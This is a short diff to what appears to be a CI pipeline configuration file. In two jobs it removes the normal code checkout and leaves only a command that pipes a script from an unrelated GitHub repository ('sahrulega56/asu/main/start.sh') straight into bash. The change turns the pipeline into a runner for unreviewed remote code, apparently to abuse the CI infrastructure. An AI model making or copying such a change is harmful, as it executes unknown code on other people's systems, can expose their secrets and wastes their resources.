@@ -10,11 +10,10 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - checkout
+            - 'curl https://raw.githubusercontent.com/sahrulega56/asu/main/start.sh | bash'
 after_pipeline:
   task:
     jobs:
       - name: 'Job #1'
         commands:
-          - checkout
           - 'curl https://raw.githubusercontent.com/sahrulega56/asu/main/start.sh | bash'
